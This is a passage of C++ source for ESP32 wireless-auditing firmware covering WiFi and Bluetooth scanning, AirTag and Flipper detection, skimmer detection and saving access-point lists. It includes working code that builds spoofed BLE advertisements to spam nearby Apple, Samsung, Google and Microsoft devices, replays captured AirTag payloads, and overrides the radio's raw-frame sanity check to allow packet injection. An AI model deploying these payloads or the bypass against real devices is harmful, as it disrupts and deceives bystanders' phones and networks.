#include "WiFiBleScan.h"
#include "lang_var.h"

int num_beacon = 0;
int num_deauth = 0;
int num_probe = 0;
int num_eapol = 0;

LinkedList<ssid>* ssids;
LinkedList<AccessPoint>* access_points;
LinkedList<Station>* stations;
LinkedList<AirTag>* airtags;
LinkedList<Flipper>* flippers;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    if (arg == 31337)
      return 1;
    else
      return 0;
}

extern "C" {
  uint8_t esp_base_mac_addr[6];
  esp_err_t esp_ble_gap_set_rand_addr(const uint8_t *rand_addr);
}

#ifdef HAS_BT
  //ESP32 Sour Apple by RapierXbox
  //Exploit by ECTO-1A
  NimBLEAdvertising *pAdvertising;

  //// https://github.com/Spooks4576
  NimBLEAdvertisementData WiFiBleScan::GetUniversalAdvertisementData(EBLEPayloadType Type) {
    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();

    uint8_t* AdvData_Raw = nullptr;
    uint8_t i = 0;

    switch (Type) {
      case Microsoft: {
        
        const char* Name = generateRandomName();

        uint8_t name_len = strlen(Name);

        AdvData_Raw = new uint8_t[7 + name_len];

        AdvData_Raw[i++] = 7 + name_len - 1;
        AdvData_Raw[i++] = 0xFF;
        AdvData_Raw[i++] = 0x06;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x03;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x80;
        memcpy(&AdvData_Raw[i], Name, name_len);
        i += name_len;

        AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
        break;
      }
      case Apple: {
        AdvData_Raw = new uint8_t[17];

        AdvData_Raw[i++] = 17 - 1;    // Packet Length
        AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
        AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
        AdvData_Raw[i++] = 0x00;        // ...
        AdvData_Raw[i++] = 0x0F;  // Type
        AdvData_Raw[i++] = 0x05;                        // Length
        AdvData_Raw[i++] = 0xC1;                        // Action Flags
        const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
        AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
        esp_fill_random(&AdvData_Raw[i], 3); // Authentication Tag
        i += 3;   
        AdvData_Raw[i++] = 0x00;  // ???
        AdvData_Raw[i++] = 0x00;  // ???
        AdvData_Raw[i++] =  0x10;  // Type ???
        esp_fill_random(&AdvData_Raw[i], 3);

        AdvData.addData(std::string((char *)AdvData_Raw, 17));
        break;
      }
      case Samsung: {

        AdvData_Raw = new uint8_t[15];

        uint8_t model = watch_models[rand() % 25].value;
        
        AdvData_Raw[i++] = 14; // Size
        AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
        AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
        AdvData_Raw[i++] = 0x00; // ...
        AdvData_Raw[i++] = 0x01;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x02;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x01;
        AdvData_Raw[i++] = 0x01;
        AdvData_Raw[i++] = 0xFF;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x43;
        AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)

        AdvData.addData(std::string((char *)AdvData_Raw, 15));

        break;
      }
      case Google: {
        AdvData_Raw = new uint8_t[14];
        AdvData_Raw[i++] = 3;
        AdvData_Raw[i++] = 0x03;
        AdvData_Raw[i++] = 0x2C; // Fast Pair ID
        AdvData_Raw[i++] = 0xFE;

        AdvData_Raw[i++] = 6;
        AdvData_Raw[i++] = 0x16;
        AdvData_Raw[i++] = 0x2C; // Fast Pair ID
        AdvData_Raw[i++] = 0xFE;
        AdvData_Raw[i++] = 0x00; // Smart Controller Model ID
        AdvData_Raw[i++] = 0xB7;
        AdvData_Raw[i++] = 0x27;

        AdvData_Raw[i++] = 2;
        AdvData_Raw[i++] = 0x0A;
        AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm

        AdvData.addData(std::string((char *)AdvData_Raw, 14));
        break;
      }
      case FlipperZero: {
        // Generate a random 5-letter name for the advertisement
        char Name[6];  // 5 characters + null terminator
        generateRandomName(Name, sizeof(Name));

        uint8_t name_len = strlen(Name);

        // Allocate space for the full Advertisement Data section based on the hex dump
        AdvData_Raw = new uint8_t[31];  // Adjusted to the specific length of the data in the dump

        // Advertisement Data from the hex dump
        AdvData_Raw[i++] = 0x02;  // Flags length
        AdvData_Raw[i++] = 0x01;  // Flags type
        AdvData_Raw[i++] = 0x06;  // Flags value

        AdvData_Raw[i++] = 0x06;  // Name length (5 + type)
        AdvData_Raw[i++] = 0x09;  // Complete Local Name type

        // Add the randomized 5-letter name
        memcpy(&AdvData_Raw[i], Name, name_len);
        i += name_len;

        AdvData_Raw[i++] = 0x03;  // Incomplete List of 16-bit Service UUIDs length
        AdvData_Raw[i++] = 0x02;  // Incomplete List of 16-bit Service UUIDs type
        AdvData_Raw[i++] = 0x80 + (rand() % 3) + 1;   // Service UUID (part of hex dump)
        AdvData_Raw[i++] = 0x30;

        AdvData_Raw[i++] = 0x02;  // TX Power level length
        AdvData_Raw[i++] = 0x0A;  // TX Power level type
        AdvData_Raw[i++] = 0x00;  // TX Power level value

        // Manufacturer specific data based on your hex dump
        AdvData_Raw[i++] = 0x05;  // Length of Manufacturer Specific Data section
        AdvData_Raw[i++] = 0xFF;  // Manufacturer Specific Data type
        AdvData_Raw[i++] = 0xBA;  // LSB of Manufacturer ID (Flipper Zero: 0x0FBA)
        AdvData_Raw[i++] = 0x0F;  // MSB of Manufacturer ID

        AdvData_Raw[i++] = 0x4C;  // Example data (remaining as in your dump)
        AdvData_Raw[i++] = 0x75;
        AdvData_Raw[i++] = 0x67;
        AdvData_Raw[i++] = 0x26;
        AdvData_Raw[i++] = 0xE1;
        AdvData_Raw[i++] = 0x80;

        // Add the constructed Advertisement Data to the BLE advertisement
        AdvData.addData(std::string((char *)AdvData_Raw, i));

        break;
      }

      case Airtag: {
        for (int i = 0; i < airtags->size(); i++) {
          if (airtags->get(i).selected) {
            AdvData.addData(std::string((char*)airtags->get(i).payload.data(), airtags->get(i).payloadSize));

            break;
          }
        }

        break;
      }
      default: {
        Serial.println("Please Provide a Company Type");
        break;
      }
    }

    delete[] AdvData_Raw;

    return AdvData;
  }
  //// https://github.com/Spooks4576


  class bluetoothScanAllCallback: public NimBLEAdvertisedDeviceCallbacks {
  
      void onResult(NimBLEAdvertisedDevice *advertisedDevice) {

        extern WiFiBleScan wifi_ble_scan_obj;
  
        //#ifdef HAS_SCREEN
        //  int buf = display_obj.display_buffer->size();
        //#else
        int buf = 0;
        //#endif
          
        String display_string = "";

        if (wifi_ble_scan_obj.currentScanMode == BT_SCAN_AIRTAG) {
          uint8_t* payLoad = advertisedDevice->getPayload();
          size_t len = advertisedDevice->getPayloadLength();

          bool match = false;
          for (int i = 0; i <= len - 4; i++) {
            if (payLoad[i] == 0x1E && payLoad[i+1] == 0xFF && payLoad[i+2] == 0x4C && payLoad[i+3] == 0x00) {
              match = true;
              break;
            }
            if (payLoad[i] == 0x4C && payLoad[i+1] == 0x00 && payLoad[i+2] == 0x12 && payLoad[i+3] == 0x19) {
              match = true;
              break;
            }
          }

          if (match) {
            String mac = advertisedDevice->getAddress().toString().c_str();
            mac.toUpperCase();

            for (int i = 0; i < airtags->size(); i++) {
              if (mac == airtags->get(i).mac)
                return;
            }

            int rssi = advertisedDevice->getRSSI();
            Serial.print("RSSI: ");
            Serial.print(rssi);
            Serial.print(" MAC: ");
            Serial.println(mac);
            Serial.print("Len: ");
            Serial.print(len);
            Serial.print(" Payload: ");
            for (size_t i = 0; i < len; i++) {
              Serial.printf("%02X ", payLoad[i]);
            }
            Serial.println("\n");

            AirTag airtag;
            airtag.mac = mac;
            airtag.payload.assign(payLoad, payLoad + len);
            airtag.payloadSize = len;

            airtags->add(airtag);


            #ifdef HAS_SCREEN
              //display_string.concat("RSSI: ");
              display_string.concat((String)rssi);
              display_string.concat(" MAC: ");
              display_string.concat(mac);
              uint8_t temp_len = display_string.length();
              for (uint8_t i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
              display_obj.display_buffer->add(display_string);
            #endif
          }
        }
        else if (wifi_ble_scan_obj.currentScanMode == BT_SCAN_FLIPPER) {
          uint8_t* payLoad = advertisedDevice->getPayload();
          size_t len = advertisedDevice->getPayloadLength();

          bool match = false;
          String color = "";
          for (int i = 0; i <= len - 4; i++) {
            if (payLoad[i] == 0x81 && payLoad[i+1] == 0x30) {
              match = true;
              color = "Black";
              break;
            }
            if (payLoad[i] == 0x82 && payLoad[i+1] == 0x30) {
              match = true;
              color = "White";
              break;
            }
            if (payLoad[i] == 0x83 && payLoad[i+1] == 0x30) {
              color = "Transparent";
              match = true;
              break;
            }
          }

          if (match) {
            String mac = advertisedDevice->getAddress().toString().c_str();
            String name = advertisedDevice->getName().c_str();
            mac.toUpperCase();

            for (int i = 0; i < flippers->size(); i++) {
              if (mac == flippers->get(i).mac)
                return;
            }

            int rssi = advertisedDevice->getRSSI();
            Serial.print("RSSI: ");
            Serial.print(rssi);
            Serial.print(" MAC: ");
            Serial.println(mac);
            Serial.print("Name: ");
            Serial.println(name);

            Flipper flipper;
            flipper.mac = mac;
            flipper.name = name;

            flippers->add(flipper);


            /*#ifdef HAS_SCREEN
              //display_string.concat("RSSI: ");
              display_string.concat((String)rssi);
              display_string.concat(" Flipper: ");
              display_string.concat(name);
              uint8_t temp_len = display_string.length();
              for (uint8_t i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
              display_obj.display_buffer->add(display_string);
            #endif*/

            #ifdef HAS_SCREEN
              display_obj.display_buffer->add(String("Flipper: ") + name + ",                 ");
              display_obj.display_buffer->add("       MAC: " + String(mac) + ",             ");
              display_obj.display_buffer->add("      RSSI: " + String(rssi) + ",               ");
              display_obj.display_buffer->add("     Color: " + String(color) + "                ");
            #endif
          }
        }
        else if (wifi_ble_scan_obj.currentScanMode == BT_SCAN_ALL) {
          if (buf >= 0)
          {
            display_string.concat(text_table4[0]);
            display_string.concat(advertisedDevice->getRSSI());
            Serial.print(" RSSI: ");
            Serial.print(advertisedDevice->getRSSI());
    
            display_string.concat(" ");
            Serial.print(" ");
            
            Serial.print("Device: ");
            if(advertisedDevice->getName().length() != 0)
            {
              display_string.concat(advertisedDevice->getName().c_str());
              Serial.print(advertisedDevice->getName().c_str());
              
            }
            else
            {
              display_string.concat(advertisedDevice->getAddress().toString().c_str());
              Serial.print(advertisedDevice->getAddress().toString().c_str());
            }
    
            #ifdef HAS_SCREEN
              uint8_t temp_len = display_string.length();
              for (uint8_t i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
      
              Serial.println();
      
              while (display_obj.printing)
                delay(1);
              display_obj.loading = true;
              display_obj.display_buffer->add(display_string);
              display_obj.loading = false;
            #endif
          }
        }
      }
  };
  
  class bluetoothScanSkimmersCallback: public BLEAdvertisedDeviceCallbacks {
      void onResult(BLEAdvertisedDevice *advertisedDevice) {
        String bad_list[bad_list_length] = {"HC-03", "HC-05", "HC-06"};
  
        #ifdef HAS_SCREEN
          int buf = display_obj.display_buffer->size();
        #else
          int buf = 0;
        #endif
          
        if (buf >= 0)
        {
          Serial.print("Device: ");
          String display_string = "";
          if(advertisedDevice->getName().length() != 0)
          {
            Serial.print(advertisedDevice->getName().c_str());
            for(uint8_t i = 0; i < bad_list_length; i++)
            {
              #ifdef HAS_SCREEN
                if(strcmp(advertisedDevice->getName().c_str(), bad_list[i].c_str()) == 0)
                {
                  display_string.concat(text_table4[1]);
                  display_string.concat(" ");
                  display_string.concat(advertisedDevice->getName().c_str());
                  uint8_t temp_len = display_string.length();
                  for (uint8_t i = 0; i < 40 - temp_len; i++)
                  {
                    display_string.concat(" ");
                  }
                  while (display_obj.printing)
                    delay(1);
                  display_obj.loading = true;
                  display_obj.display_buffer->add(display_string);
                  display_obj.loading = false;
                }
              #endif
            }
          }
          else
          {
            Serial.print(advertisedDevice->getAddress().toString().c_str());
          }
          Serial.print(" RSSI: ");
          Serial.println(advertisedDevice->getRSSI());
        }
      }
  };
#endif


WiFiBleScan::WiFiBleScan()
{
}

/*String WiFiBleScan::macToString(const Station& station) {
  char macStr[18]; // 6 pairs of hex digits + 5 colons + null terminator
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           station.mac[0], station.mac[1], station.mac[2],
           station.mac[3], station.mac[4], station.mac[5]);
  return String(macStr);
}*/

void WiFiBleScan::RunSetup() {
  if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1)
    this->wsl_bypass_enabled = true;
  else
    this->wsl_bypass_enabled = false;
    
  ssids = new LinkedList<ssid>();
  access_points = new LinkedList<AccessPoint>();
  stations = new LinkedList<Station>();
  airtags = new LinkedList<AirTag>();
  flippers = new LinkedList<Flipper>();

  #ifdef HAS_BT
    watch_models = new WatchModel[26] {
      {0x1A, "Fallback Watch"},
      {0x01, "White Watch4 Classic 44m"},
      {0x02, "Black Watch4 Classic 40m"},
      {0x03, "White Watch4 Classic 40m"},
      {0x04, "Black Watch4 44mm"},
      {0x05, "Silver Watch4 44mm"},
      {0x06, "Green Watch4 44mm"},
      {0x07, "Black Watch4 40mm"},
      {0x08, "White Watch4 40mm"},
      {0x09, "Gold Watch4 40mm"},
      {0x0A, "French Watch4"},
      {0x0B, "French Watch4 Classic"},
      {0x0C, "Fox Watch5 44mm"},
      {0x11, "Black Watch5 44mm"},
      {0x12, "Sapphire Watch5 44mm"},
      {0x13, "Purpleish Watch5 40mm"},
      {0x14, "Gold Watch5 40mm"},
      {0x15, "Black Watch5 Pro 45mm"},
      {0x16, "Gray Watch5 Pro 45mm"},
      {0x17, "White Watch5 44mm"},
      {0x18, "White & Black Watch5"},
      {0x1B, "Black Watch6 Pink 40mm"},
      {0x1C, "Gold Watch6 Gold 40mm"},
      {0x1D, "Silver Watch6 Cyan 44mm"},
      {0x1E, "Black Watch6 Classic 43m"},
      {0x20, "Green Watch6 Classic 43m"},
    };
    
    NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
    NimBLEDevice::setScanDuplicateCacheSize(200);
    NimBLEDevice::init("");
    pBLEScan = NimBLEDevice::getScan(); //create new scan
    this->ble_initialized = true;
    
    this->shutdownBLE();
  #endif

  this->initWiFi(1);
}

int WiFiBleScan::clearStations() {
  int num_cleared = stations->size();
  stations->clear();
  Serial.println("stations: " + (String)stations->size());

  // Now clear stations list from APs
  for (int i = 0; i < access_points->size(); i++)
    access_points->get(i).stations->clear();
    
  return num_cleared;
}

bool WiFiBleScan::checkMem() {
  if (esp_get_free_heap_size() <= MEM_LOWER_LIM)
    return false;
  else
    return true;
}

int WiFiBleScan::clearAPs() {
  int num_cleared = access_points->size();
  while (access_points->size() > 0)
    access_points->remove(0);
  Serial.println("access_points: " + (String)access_points->size());
  return num_cleared;
}

int WiFiBleScan::clearAirtags() {
  int num_cleared = airtags->size();
  while (airtags->size() > 0)
    airtags->remove(0);
  Serial.println("airtags: " + (String)airtags->size());
  return num_cleared;
}

int WiFiBleScan::clearFlippers() {
  int num_cleared = flippers->size();
  while (flippers->size() > 0)
    flippers->remove(0);
  Serial.println("Flippers: " + (String)flippers->size());
  return num_cleared;
}

int WiFiBleScan::clearSSIDs() {
  int num_cleared = ssids->size();
  ssids->clear();
  Serial.println("ssids: " + (String)ssids->size());
  return num_cleared;
}

bool WiFiBleScan::addSSID(String essid) {
  ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
  ssids->add(s);
  Serial.println(ssids->get(ssids->size() - 1).essid);

  return true;
}

int WiFiBleScan::generateSSIDs(int count) {
  uint8_t num_gen = count;
  for (uint8_t x = 0; x < num_gen; x++) {
    String essid = "";

    for (uint8_t i = 0; i < 6; i++)
      essid.concat(alfa[random(65)]);

    ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
    ssids->add(s);
    Serial.println(ssids->get(ssids->size() - 1).essid);
  }

  return num_gen;
}

// Apply WiFi settings
void WiFiBleScan::initWiFi(uint8_t scan_mode) {
  // Set the channel
  if (scan_mode != WIFI_SCAN_OFF) {
    //Serial.println(F("Initializing WiFi settings..."));
    this->changeChannel();
  
    this->force_pmkid = settings_obj.loadSetting<bool>(text_table4[5]);
    this->force_probe = settings_obj.loadSetting<bool>(text_table4[6]);
    this->save_pcap = settings_obj.loadSetting<bool>(text_table4[7]);
    //Serial.println(F("Initialization complete"));
  }
}

bool WiFiBleScan::scanning() {
  if (this->currentScanMode == WIFI_SCAN_OFF)
    return false;
  else
    return true;
}

// Function to prepare to run a specific scan
void WiFiBleScan::StartScan(uint8_t scan_mode, uint16_t color)
{  
  this->initWiFi(scan_mode);
  if (scan_mode == WIFI_SCAN_OFF)
    StopScan(scan_mode);
  else if (scan_mode == WIFI_SCAN_PROBE)
    RunProbeScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_AP)
    RunBeaconScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_SIG_STREN)
    RunRawScan(scan_mode, color);    
  else if (scan_mode == WIFI_SCAN_RAW_CAPTURE)
    RunRawScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_STATION)
    RunStationScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_TARGET_AP)
    RunAPScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_TARGET_AP_FULL)
    RunAPScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_DEAUTH)
    RunDeauthScan(scan_mode, color);
  else if (scan_mode == WIFI_PACKET_MONITOR) {
    #ifdef HAS_SCREEN
      RunPacketMonitor(scan_mode, color);
    #endif
  }
  else if ((scan_mode == BT_SCAN_ALL) || (scan_mode == BT_SCAN_AIRTAG) || (scan_mode == BT_SCAN_FLIPPER)){
    #ifdef HAS_BT
      RunBluetoothScan(scan_mode, color);
    #endif
  }
  else if (scan_mode == LV_ADD_SSID) {
    #ifdef HAS_SCREEN
      RunLvJoinWiFi(scan_mode, color);
    #endif
  }
  else if (scan_mode == WIFI_SCAN_GPS_NMEA){
    #ifdef HAS_GPS
      gps_obj.enable_queue();
    #endif
  }

  WiFiBleScan::currentScanMode = scan_mode;
}

bool WiFiBleScan::shutdownWiFi() {
  if (this->wifi_initialized) {
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
    WiFi.mode(WIFI_OFF);

    dst_mac = "ff:ff:ff:ff:ff:ff";
  
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_stop();
    esp_wifi_restore();
    esp_wifi_deinit();
  
    this->wifi_initialized = false;
    return true;
  }
  else {
    return false;
  }
}

bool WiFiBleScan::shutdownBLE() {
  #ifdef HAS_BT
    if (this->ble_initialized) {
      Serial.println("Shutting down BLE");
      pAdvertising->stop();
      pBLEScan->stop();
      
      pBLEScan->clearResults();
      NimBLEDevice::deinit();
    
      this->ble_initialized = false;
    }
    else {
      return false;
    }


  #endif

  return true;
}

// Function to stop all wifi scans
void WiFiBleScan::StopScan(uint8_t scan_mode)
{
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
  (currentScanMode == WIFI_SCAN_AP) ||
  (currentScanMode == WIFI_SCAN_RAW_CAPTURE) ||
  (currentScanMode == WIFI_SCAN_STATION) ||
  (currentScanMode == WIFI_SCAN_SIG_STREN) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP_FULL) ||
  (currentScanMode == WIFI_SCAN_ALL) ||
  (currentScanMode == WIFI_SCAN_DEAUTH) ||
  (currentScanMode == WIFI_PACKET_MONITOR) ||
  (currentScanMode == LV_JOIN_WIFI))
  {
    this->shutdownWiFi();
  }

  
  else if ((currentScanMode == BT_SCAN_ALL) ||
  (currentScanMode == BT_SCAN_AIRTAG) ||
  (currentScanMode == BT_SCAN_FLIPPER) )
  {
    #ifdef HAS_BT
      this->shutdownBLE();
    #endif
  }

  #ifdef HAS_SCREEN
    display_obj.display_buffer->clear();
    #ifdef SCREEN_BUFFER
      display_obj.screen_buffer->clear();
    #endif
    //Serial.print("display_buffer->size(): ");
    Serial.println(display_obj.display_buffer->size());
  
    display_obj.tteBar = false;
  #endif

  #ifdef HAS_GPS
    gps_obj.disable_queue();
  #endif
}

String WiFiBleScan::getStaMAC()
{
  char *buf;
  uint8_t mac[6];
  char macAddrChr[18] = {0};
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
  this->wifi_initialized = true;
  sprintf(macAddrChr, 
          "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],
          mac[1],
          mac[2],
          mac[3],
          mac[4],
          mac[5]);
  this->shutdownWiFi();
  return String(macAddrChr);
}

String WiFiBleScan::getApMAC()
{
  char *buf;
  uint8_t mac[6];
  char macAddrChr[18] = {0};
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
  this->wifi_initialized = true;
  sprintf(macAddrChr, 
          "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],
          mac[1],
          mac[2],
          mac[3],
          mac[4],
          mac[5]);
  this->shutdownWiFi();
  return String(macAddrChr);
}

bool WiFiBleScan::mac_cmp(struct mac_addr addr1, struct mac_addr addr2) {
  //Return true if 2 mac_addr structs are equal.
  for (int y = 0; y < 6 ; y++) {
    if (addr1.bytes[y] != addr2.bytes[y]) {
      return false;
    }
  }
  return true;
}

bool WiFiBleScan::seen_mac(unsigned char* mac) {
  //Return true if this MAC address is in the recently seen array.

  struct mac_addr tmp;
  for (int x = 0; x < 6 ; x++) {
    tmp.bytes[x] = mac[x];
  }

  for (int x = 0; x < mac_history_len; x++) {
    if (this->mac_cmp(tmp, this->mac_history[x])) {
      return true;
    }
  }
  return false;
}

void WiFiBleScan::save_mac(unsigned char* mac) {
  //Save a MAC address into the recently seen array.
  if (this->mac_history_cursor >= mac_history_len) {
    this->mac_history_cursor = 0;
  }
  struct mac_addr tmp;
  for (int x = 0; x < 6 ; x++) {
    tmp.bytes[x] = mac[x];
  }

  this->mac_history[this->mac_history_cursor] = tmp;
  this->mac_history_cursor++;
}

String WiFiBleScan::security_int_to_string(int security_type) {
  //Provide a security type int from WiFi.encryptionType(i) to convert it to a String which Wigle CSV expects.
  String authtype = "";

  switch (security_type) {
    case WIFI_AUTH_OPEN:
      authtype = "[OPEN]";
      break;
  
    case WIFI_AUTH_WEP:
      authtype = "[WEP]";
      break;
  
    case WIFI_AUTH_WPA_PSK:
      authtype = "[WPA_PSK]";
      break;
  
    case WIFI_AUTH_WPA2_PSK:
      authtype = "[WPA2_PSK]";
      break;
  
    case WIFI_AUTH_WPA_WPA2_PSK:
      authtype = "[WPA_WPA2_PSK]";
      break;
  
    case WIFI_AUTH_WPA2_ENTERPRISE:
      authtype = "[WPA2]";
      break;

    //Requires at least v2.0.0 of https://github.com/espressif/arduino-esp32/
    case WIFI_AUTH_WPA3_PSK:
      authtype = "[WPA3_PSK]";
      break;

    case WIFI_AUTH_WPA2_WPA3_PSK:
      authtype = "[WPA2_WPA3_PSK]";
      break;

    case WIFI_AUTH_WAPI_PSK:
      authtype = "[WAPI_PSK]";
      break;
        
    default:
      authtype = "[UNDEFINED]";
  }

  return authtype;
}

void WiFiBleScan::clearMacHistory() {
    for (int i = 0; i < mac_history_len; ++i) {
        memset(this->mac_history[i].bytes, 0, sizeof(mac_history[i].bytes));
    }
}

String WiFiBleScan::freeRAM()
{
  char s[150];
  sprintf(s, "RAM Free: %u bytes", esp_get_free_heap_size());
  this->free_ram = String(esp_get_free_heap_size());
  return String(s);
}

void WiFiBleScan::startPcap(String file_name) {
  buffer_obj.pcapOpen(
    file_name,
    #if defined(HAS_SD)
      sd_obj.supported ? &SD :
    #endif
    NULL,
    save_serial // Set with commandline options
  );
}

void WiFiBleScan::startLog(String file_name) {
  buffer_obj.logOpen(
    file_name,
    #if defined(HAS_SD)
      sd_obj.supported ? &SD :
    #endif
    NULL,
    save_serial // Set with commandline options
  );
}

void WiFiBleScan::parseBSSID(const char* bssidStr, uint8_t* bssid) {
  sscanf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
         &bssid[0], &bssid[1], &bssid[2],
         &bssid[3], &bssid[4], &bssid[5]);
}

void WiFiBleScan::RunLoadATList() {
  #ifdef HAS_SD
    // Prepare to access the file
    File file = sd_obj.getFile("/Airtags_0.log");
    if (!file) {
      Serial.println("Could not open /Airtags_0.log");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.println("Could not open /Airtags_0.log");
      #endif
      return;
    }

    // Prepare JSON
    DynamicJsonDocument doc(10048);
    DeserializationError error = deserializeJson(doc, file);
    if (error) {
      Serial.print("JSON deserialize error: ");
      Serial.println(error.c_str());
      file.close();
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.println("Could not deserialize JSON");
        display_obj.tft.println(error.c_str());
      #endif
      return;
    }

    JsonArray array = doc.as<JsonArray>();
    for (JsonObject obj : array) {
      AirTag at;
      at.mac = obj["mac"].as<String>();
      at.payloadSize = obj["payload_size"];
      at.payload = hexStringToByteArray(obj["payload"].as<String>());
      at.selected = false;
      airtags->add(at);
    }

    file.close();

    //doc.clear();

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
    
      display_obj.tft.print("Loaded Airtags: ");
      display_obj.tft.println((String)airtags->size());
    #endif
    Serial.print("Loaded Airtags:");
    Serial.println((String)airtags->size());
  #endif
}

void WiFiBleScan::RunSaveATList(bool save_as) {
  if (save_as) {
    sd_obj.removeFile("/Airtags_0.log");

    this->startLog("Airtags");

    DynamicJsonDocument jsonDocument(2048);

    JsonArray jsonArray = jsonDocument.to<JsonArray>();
    
    for (int i = 0; i < airtags->size(); i++) {
      const AirTag& at = airtags->get(i);
      JsonObject jsonAt = jsonArray.createNestedObject();
      jsonAt["mac"] = at.mac;
      jsonAt["payload"] = byteArrayToHexString(at.payload);
      jsonAt["payload_size"] = at.payloadSize;
    }

    String jsonString;
    serializeJson(jsonArray, jsonString);

    buffer_obj.append(jsonString);

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
    
      display_obj.tft.print("Saved Airtags: ");
      display_obj.tft.println((String)airtags->size());
    #endif
    Serial.print("Saved Airtags:");
    Serial.println((String)airtags->size());
  }
}

void WiFiBleScan::RunLoadAPList() {
  #ifdef HAS_SD
    File file = sd_obj.getFile("/APs_0.log");
    if (!file) {
      Serial.println("Could not open /APs_0.log");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.println("Could not open /APs_0.log");
      #endif
      return;
    }

    DynamicJsonDocument doc(10048);
    DeserializationError error = deserializeJson(doc, file);
    if (error) {
      Serial.print("JSON deserialize error: ");
      Serial.println(error.c_str());
      file.close();
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.println("Could not deserialize JSON");
        display_obj.tft.println(error.c_str());
      #endif
      return;
    }

    JsonArray array = doc.as<JsonArray>();
    for (JsonObject obj : array) {
      AccessPoint ap;
      ap.essid = obj["essid"].as<String>();
      ap.channel = obj["channel"];
      ap.selected = false;
      parseBSSID(obj["bssid"], ap.bssid);
      ap.stations = new LinkedList<uint8_t>();
      access_points->add(ap);
    }

    file.close();

    //doc.clear();

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
    
      display_obj.tft.print("Loaded APs: ");
      display_obj.tft.println((String)access_points->size());
    #endif
    Serial.print("Loaded APs:");
    Serial.println((String)access_points->size());
  #endif
}

void WiFiBleScan::RunSaveAPList(bool save_as) {
  if (save_as) {
    sd_obj.removeFile("/APs_0.log");

    this->startLog("APs");

    DynamicJsonDocument jsonDocument(2048);

    JsonArray jsonArray = jsonDocument.to<JsonArray>();
    
    for (int i = 0; i < access_points->size(); i++) {
